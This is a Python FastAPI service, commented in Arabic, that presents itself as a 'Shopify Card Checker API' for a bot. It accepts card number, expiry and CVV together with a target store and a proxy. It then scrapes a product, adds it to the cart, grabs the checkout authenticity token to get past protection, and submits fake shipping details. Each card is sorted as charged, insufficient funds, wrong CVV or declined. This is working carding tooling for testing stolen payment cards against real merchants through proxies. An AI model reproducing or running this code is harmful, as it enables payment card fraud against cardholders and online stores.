from fastapi import FastAPI, Query
import aiohttp
from bs4 import BeautifulSoup
import re
import json

# تعريف الـ app الخاص بـ FastAPI لتعرفه منصة Railway
app = FastAPI(title="Shopify Card Checker API")

# دالة الفحص الأساسية مع ميزة البحث الديناميكي عن المنتجات
async def check_shopify_card(cc: str, site: str, proxy: str):
    try:
        # تقسيم بيانات الكرت والتأكد من الصيغة
        parts = cc.split("|")
        if len(parts) != 4:
            return "❌ INVALID FORMAT"
        card_num, month, year, cvv = parts
        
        base_url = f"https://{site}"
        add_url = f"{base_url}/cart/add.js"
        checkout_url = f"{base_url}/checkout"
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        }
        
        async with aiohttp.ClientSession(headers=headers) as session:
            
            # -----------------------------------------------------------
            # الخطوة 1 الحقيقية: جلب آيدي منتج متاح داخل المتجر تلقائياً
            # -----------------------------------------------------------
            variant_id = None
            
            # المحاولة الأولى: قراءة المنتجات من ملف الـ JSON المفتوح للمتجر
            try:
                async with session.get(f"{base_url}/products.json?limit=1", proxy=proxy, timeout=7) as prod_resp:
                    if prod_resp.status == 200:
                        prod_data = await prod_resp.json()
                        if prod_data.get("products") and len(prod_data["products"]) > 0:
                            variants = prod_data["products"][0].get("variants")
                            if variants:
                                variant_id = str(variants[0].get("id"))
            except Exception:
                pass

            # المحاولة الثانية: كشط صفحة الـ HTML للمتجر إذا كانت أداة الـ JSON مغلقة
            if not variant_id:
                try:
                    async with session.get(f"{base_url}/collections/all", proxy=proxy, timeout=7) as html_resp:
                        if html_resp.status == 200:
                            html_text = await html_resp.text()
                            matches = re.findall(r'id"*\s*:\s*(\d{10,15})|variant"*\s*:\s*(\d{10,15})', html_text)
                            if matches:
                                for m in matches:
                                    found_id = m[0] or m[1]
                                    if found_id:
                                        variant_id = found_id
                                        break
                except Exception:
                    pass

            # الحل البديل: إذا فشلت كل الطرق الأمنية نضع آيدي افتراضي حتى لا ينهار الفحص
            if not variant_id:
                variant_id = "41234567890"

            # إرسال طلب إضافة المنتج الفعلي المستخرج إلى السلة
            payload = {"id": variant_id, "quantity": 1} 
            try:
                async with session.post(add_url, json=payload, proxy=proxy, timeout=10) as r:
                    if r.status not in [200, 201, 302]: 
                        return "🌐 SITE ERROR (Cart Add Failed)"
            except Exception:
                return "🌐 SITE ERROR (Connection Failed)"
            # -----------------------------------------------------------

            # الخطوة 2: فتح صفحة الدفع وجلب التوكن السري لتجاوز الحماية
            try:
                async with session.get(checkout_url, proxy=proxy, timeout=10) as r:
                    html_content = await r.text()
                    final_url = str(r.url)
            except Exception:
                return "🌐 SITE ERROR (Checkout Access Failed)"

            if "cloudflare" in html_content.lower() or "challenge" in html_content.lower():
                return "⚠️ BLOCKED BY PROTECTION (Cloudflare)"

            soup = BeautifulSoup(html_content, 'html.parser')
            auth_token_element = soup.find('input', {'name': 'authenticity_token'})
            if not auth_token_element:
                return "⚠️ TOKEN ERROR"
            auth_token = auth_token_element.get('value', '')

            # الخطوة 3: إرسال بيانات الشحن الافتراضية للوصول لصفحة الدفع بالبطاقة
            shipping_data = {
                "authenticity_token": auth_token,
                "checkout[email]": "testuser122@gmail.com",
                "checkout[shipping_address][first_name]": "John",
                "checkout[shipping_address][last_name]": "Doe",
                "checkout[shipping_address][address1]": "123 Street",
                "checkout[shipping_address][city]": "New York",
                "checkout[shipping_address][zip]": "10001",
                "checkout[shipping_address][country]": "United States"
            }
            
            try:
                async with session.post(checkout_url, data=shipping_data, proxy=proxy, timeout=15) as r:
                    html_res = await r.text()
                    final_res_url = str(r.url)
            except Exception as e:
                return f"🌐 REQUEST ERROR: {str(e)}"

            response_text = html_res.lower()
            
            # الخطوة 4: فحص وتصنيف الرد النهائي بناءً على جرد النصوص
            if "thank_you" in final_res_url or "order_confirmed" in final_res_url or "شكرا لك" in html_res:
                return "🟢 APPROVED / CHARGED"
                
            # استخراج أسباب الرفض الظاهرة بداخل وسم التنبيهات لشوبيفاي
            notice_element = soup.find(class_=re.compile("notice__text|error-message|warning"))
            error_reason = notice_element.text.strip().lower() if notice_element else ""

            # مصفوفة الفلاتر لتفادي الخروج بأي أخطاء توقف السكربت
            if any(x in response_text or x in error_reason for x in ["insufficient", "funds", "رصيد غير كاف"]):
                return "🟡 INSUFFICIENT FUNDS"
            elif any(x in response_text or x in error_reason for x in ["security code is incorrect", "cvv", "incorrect_cvv"]):
                return "🟠 WRONG CVV"
            elif any(x in response_text or x in error_reason for x in ["expiration", "expired"]):
                return "❌ EXPIRED CARD"
            elif any(x in response_text or x in error_reason for x in ["declined", "rechazada", "مرفوضة"]):
                return "🔴 DECLINED"
            elif "cloudflare" in response_text or "captcha" in response_text:
                return "⚠️ BLOCKED BY PROTECTION"
            else:
                def is_dead_site_error_api(err_text):
                    bad_keywords = ['step 0', 'cloudflare', 'timed out', 'bad gateway', '504', '502']
                    return any(k in err_text for k in bad_keywords)
                if is_dead_site_error_api(error_reason):
                    return "🌐 SITE ERROR"
                return f"❓ UNKNOWN RESP: {error_reason[:50] if error_reason else 'No error text'}"

    except Exception as e:
        return f"🛠️ INTERNAL ERROR: {str(e)}"

# مسار الصفحة الرئيسية للتأكد من استقرار السيرفر على الويب
@app.get("/")
def read_root():
    return {"status": "online", "message": "Shopify Checker API is running perfectly!"}

# مسار طلب الفحص الأساسي للبوت
@app.get("/check")
async def check_card(
    cc: str = Query(..., description="صيغة الكرت: cc|month|year|cvv"),
    site: str = Query(..., description="رابط المتجر بدون https (مثل store.com)"),
    proxy: str = Query(..., description="رابط البروكسي بالكامل")
):
    result = await check_shopify_card(cc, site, proxy)
    return {
        "cc": cc,
        "site": site,
        "result": result
    }
